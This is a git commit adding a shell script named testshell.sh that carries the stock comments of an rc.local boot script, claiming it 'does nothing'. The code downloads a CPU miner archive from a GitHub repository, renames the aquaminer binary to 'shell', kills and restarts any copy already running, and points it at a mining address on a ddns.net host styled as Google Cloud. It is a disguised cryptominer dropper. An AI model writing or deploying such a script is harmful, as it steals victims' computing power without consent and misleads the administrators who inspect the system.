b4cadbdf8cdcf27ba4492e8f39cc58f5b6f15430
StupidmanTan <40017939+StupidmanTan@users.noreply.github.com>
2018-06-21 02:10:38 +0700

    Create testshell.sh

---
+++ testshell.sh
@@ -0,0 +1,35 @@
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+if [ -f ${PWD}/shell ]; then
+    if pgrep -x "shell" > /dev/null
+then
+pkill shell
+echo " kill process"
+./shell -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/shell
+
+    
+else
+
+echo "Miner da install , chay thoi "
+./shell -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/shell
+     
+fi
+exit
+fi
+
+wget https://github.com/StupidmanTan/miner-cpu/raw/master/kaka.zip
+unzip kaka.zip
+mv aquaminer-0.4-linux-amd64 shell
+./shell -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/shell
+
+exit 0
